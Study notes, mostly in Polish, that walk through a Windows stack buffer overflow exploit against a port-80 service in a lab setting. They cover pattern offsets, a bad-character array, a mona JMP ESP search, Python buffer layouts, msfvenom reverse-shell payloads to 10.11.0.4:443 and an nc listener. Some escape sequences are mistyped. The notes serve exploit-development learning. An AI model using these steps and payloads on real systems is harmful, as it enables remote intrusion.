0) jesli trzeba sprawdzeic wszysto to trzeba:
			- burpem/wireshark nasluchac co do ciebie wychodzi, 
			- napisac w pythonie cos co wysyla taka postac na takie pole ktore moze byc przelpelnione
			- aby debugowac trzeba sie podpiac do procesu na windowsie przez "Microsoft TCP view" aby sprwdzic jaki proces trzeba sie podpiac (powiazac port z procesem tutaj port 80).
			- wysylac w petli coraz wiekszy bufor az sie wywali aby wiedziec ile danych wywala program			




utworzenie bufora do wyslania ( /usr/share/metasploit-framework/tools/exploit/ ):

cale hakowanie nalezy zaczac od step4.py i je po kolei edytowac

1)
 	- locate pattern_create -h 
	- msf-pattern_create -l 800

2)
	to co wygeneruje nalezy wstawic w bufor :
		gotowy pliki w : step4.py
	
3) 	to co nadpisalo EIP to  42306142 czyli hexalnie: B0aB
	aby zlokalizowac ten bajt w naszym ciagu mozna uzyc msf-pattern_offset: 

	kali@kali:~$ msf-pattern_offset -l 800 -q 42306142
	[*] Exact match at offset 780



4)     Aby miec pewnosc ze eip sie nadpisze dobrze to piwnnismy wstawic tak jak ponize i powinien byc uzupelniony eip przez "B" (plik step5.py)

	 filler = "A" * 780
	 eip = "B" * 4
	 buffer = "C" * 16
	 inputBuffer = filler + eip + buffer


5) teraz nalezy wstawic kod shellcode . widac ze "C" ktore jest wyslane po "B" (do rejestru EIP - ale w tym przypadku dopiero do po 4 C przerwy. Czyli ESP nie jest zaraz za EIP ale 4 bajty dalej) , laduje w rejestrze ESP (ale dopiero do po 4 C przerwy. Czyli ESP nsie jest zaraz za EIP ale 4 bajty dalej). Ale tam juz nie wiele miejsca jest za BBBB. Zwykle shell code potrzebyj  350-400 bajtow. 
	aby sprawdzic czy sie zmienci nalezy zwiekszyc wiekosc bufora z 800 do 1500 bajtow (trzeba uwazac aby rodzac crash'a nie byl inny - bledu ktory wywala program. (step6.py)

	po opalenniu step6.py widac ze sie miesci tyle . za kazdym razem zmienia sie ESP , jak widac. ale zawsze wskazuje na "DDDD.."

6)  checking bad characters (step7.py):
    - prawym na rejestr  esp w prawym gornym oknie i "Follow in dump"	

	badchars = (
	"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
	"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
	"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
	"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
	"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
	"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
	"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
	"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
	"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
	"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
	"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
	"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
	"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
	"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
	"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
	"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
	


	After executing our proof of concept, we can right-click on ESP and select Follow in Dump to show
	the input buffer hex characters in memory


7) trzeba teraz znales dll aby skoczyc do kodu.  Bo trzba zrobic skok do ESP (replacing the B’s that overwrite EIP with the address that pops up in the ESP register at the time of the crash)

First, the addresses used in the library must be static, which eliminates libraries compiled with ASLR support. Second, the address of the instruction must not contain any of the bad characters that would break the exploit, 
since the address will be part of our input buffer


w dolnej czesci debugera trzeba wpisac:  
	!mona modules 
	wyskoczy tableka i 5 kolumn musza byc na false najlepiej :)

	From the flags in this output, we can see that the syncbrs.exe executable has SafeSEH319
	(Structured Exception Handler Overwrite, an exploit-preventative memory protection technique),
	ASLR, and NXCompat (DEP protection) disabled.


trzeba znalesc esp

	kali@kali:~$ msf-nasm_shell
	nasm > jmp esp
	00000000 FFE4 jmp esp
	nasm >


znalesc adres dla jmp esp (kod komendy znam z instrukcji powyzej):
	!mona find -s “\xff\xe4” -m “libspp.dll”

		In this example, the output reveals one address containing a JMP ESP instruction (0x10090c83),
		and fortunately, the address does not contain any of our bad character



dla sprawdzenia mozna dodac przyklad , nalezy zwrocic uwage na odrowcony adress z powodu little endian (step8.py):
	filler = "A" * 780
	eip = "\x83\x0c\x09\x10"
	offset = "C" * 4
	buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
	inputBuffer = filler + eip + offset + buffer
	...

ustaw break point i zobacz na adress




8)  generowanie shell code (step9.py):


	kali@kali:~$ msfvenom -l payloads

	wygeneroanie shell code :
		msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c		

	shell code bez znakow (bad characters):
		kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"


	shell code bez znakow (bad characters , i z EXITFUNC=thread)
		msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"


	trzeba dodac NOP (czyli  0x90) aby dobrze zadzialal exploit (step9.py)


jeszcze nopsy:
	nops = "\x90" * 10
	inputBuffer = filler + eip + offset + nops + shellcode

9) no i nslochiwanie
sudo  nc -lnvp 443


10) kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"

